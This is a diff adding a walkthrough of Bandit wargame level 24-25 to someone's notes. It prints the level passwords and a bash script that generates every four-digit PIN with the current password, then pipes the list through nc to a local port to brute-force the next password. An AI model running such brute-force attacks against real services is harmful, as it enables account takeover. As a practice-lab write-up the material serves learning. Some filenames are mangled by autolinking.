@@ -564,3 +564,39 @@ step8: now copy the file to /var/spool/bandit24/foo using the command “
 cp [myyscript.sh](http://myyscript.sh/) /var/spool/bandit24_pass.sh/foo”
 
 step9: cat pw.txt to get the pw.
+# Level 24-25
+
+## Commands used:
+
+nc, ls, nano, chmod, cat
+
+## Password:
+
+iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+
+## process:
+
+step1: login using ssh command
+
+step2: “nc [localhost](http://localhost) 30002” as given then you will get the pw when you enter the “pw_of_current_level a_pincode” and this pincode can be any number within 0 to 9999.
+
+step3: generate all the  “pw_of_current_level a_pincode” combinations using a script. code of script: “
+
+#!/bin/bash
+
+for i in {0..9}{0..9}{0..9}{0..9}
+do
+echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> list.txt;
+done”
+
+step4: before running the script make a file list.txt in level24 directory 
+
+step5: run the script using command “
+
+./pwlist.sh”
+
+step6: now display all the input combinations using command “
+
+cat list.txt”
+
+step7: now brute force using this command “cat list.txt | nc localhost 30002” then the pw will be displayed.
